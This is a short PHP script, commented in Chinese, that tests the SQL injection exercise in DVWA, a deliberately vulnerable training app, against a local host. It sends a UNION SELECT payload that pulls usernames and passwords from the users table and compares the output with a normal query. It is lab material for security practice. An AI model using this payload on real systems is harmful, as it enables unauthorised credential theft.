<?php
// DVWA SQLi low 等级验证脚本
// 前提：已登录 DVWA 且 security cookie 为 low
// 目标入口：vulnerabilities/sqli/index.php

$BASE = 'http://127.0.0.1/vulnerabilities/sqli/index.php';

function probe($url, $id) {
    $ch = curl_init($url . '?Submit=Submit&id=' . urlencode($id));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    // 携带登录会话 cookie
    curl_setopt($ch, CURLOPT_COOKIEFILE, 'cookies.txt');
    curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookies.txt');
    $html = curl_exec($ch);
    curl_close($ch);
    // 人工适配：原脚本只取第一个 <pre>，UNION 追加的行落在同一行之后，肉眼与控制流都
    // 分辨不出。改为统计结果块数量。
    preg_match_all('#<pre>.*?</pre>#s', $html, $m);
    if (!$m[0]) {
        return 'NO_RESULT_BLOCK (auth failed or not low level?)';
    }
    return count($m[0]) . " 个结果块\n" . implode("\n", array_slice($m[0], 0, 2));
}

$normal = "1";
$attack = "1' UNION SELECT user, password FROM users WHERE '1'='1";

echo "=== NORMAL INPUT id=$normal ===\n";
echo probe($BASE, $normal) . "\n\n";

echo "=== ATTACK INPUT ===\n";
echo probe($BASE, $attack) . "\n";
?>